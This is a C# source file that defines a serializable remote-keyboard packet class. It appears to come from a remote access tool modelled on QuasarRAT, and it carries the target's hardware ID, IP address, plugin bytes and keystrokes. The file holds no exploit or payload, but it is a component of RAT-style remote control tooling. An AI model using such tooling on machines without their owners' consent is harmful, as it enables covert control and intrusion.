﻿using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : QuasarRAT  ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteKeyboardPacket : IPacket
    {
        public RemoteKeyboardPacket(byte keyCode, bool isDown) : base()
        {
            this.packetType = PacketType.RM_KEYBOARD;

            this.keyCode = keyCode;
            this.isDown = isDown;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }

        public byte keyCode { get; set; }
        public bool isDown { get; set; }
    }
}
